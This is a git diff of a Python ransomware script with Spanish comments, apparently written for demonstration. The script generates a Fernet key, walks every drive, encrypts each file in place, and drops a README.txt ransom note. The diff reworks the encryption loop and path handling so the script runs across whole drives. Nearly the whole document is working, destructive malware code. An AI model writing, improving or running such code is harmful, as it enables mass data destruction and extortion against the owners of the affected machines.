@@ -30,7 +30,6 @@ def generar_key():
     key = Fernet.generate_key()
     print(key)
     with open('key.key', 'wb') as key_file:
-        print("")
         key_file.write(key)
 
 
@@ -44,6 +43,7 @@ def encrypt(item, key):
     f = Fernet(key)
     with open(item, 'rb') as file:
         file_data = file.read()
+    print("file Encrypted:", item)
     encrypted_data = f.encrypt(file_data)
     with open(item, 'wb') as file:
         file.write(encrypted_data)
@@ -63,9 +63,8 @@ def find_drives():
 def listar_files_in_dirs(rute):
     for root, dirs, files in os.walk(rute):
         for directorio in dirs:
-            new_dir = os.path.join(root, directorio)
             # Cambiar a lista en lugar de set
-            yield tuple(os.path.join(new_dir, fileName) for fileName in files)
+            yield tuple(os.path.join(root, fileName) for fileName in files)
 
 
 
@@ -78,27 +77,23 @@ if __name__ == '__main__':
             print("Permisos de administrador concedidos.")
             sys.exit()
     try:
-        files = set()
-        for drive in find_drives():
-            files.update(listar_files_in_dirs(drive))
-        
 
         # Generación la clave de cifrado y se almacena en una variable.
         generar_key()
         key = cargar_key()
+        
+        for drive in find_drives():
+            for paths in listar_files_in_dirs(drive):
+                for path in paths:
+                    try:
+                        print(f'Intentando cifrar {path}')
+                        encrypt(path, key)
 
-        while files:
-            path = files.pop()
-            print(path)
-            try:
-                print(f'Intentando cifrar {path}')
-                encrypt(path, key)
-
-            except Exception as e:
-                print('Error:', e)
-            # Mensaje para pedir el rescate guardado en el equipo atacado, normalmente en el escritorio.
-        with open( path + '\\README.txt', 'w') as file:
-            file.write('Ficheros encriptados.\nSe suele pedir un rescate para el desencriptado.')
+                    except Exception as e:
+                        print('Error:', e)
+                # Mensaje para pedir el rescate guardado en el equipo atacado, normalmente en el escritorio.
+            with open( path + '\\README.txt', 'w') as file:
+                file.write('Ficheros encriptados.\nSe suele pedir un rescate para el desencriptado.')
 
     except Exception as e:
         print(e)
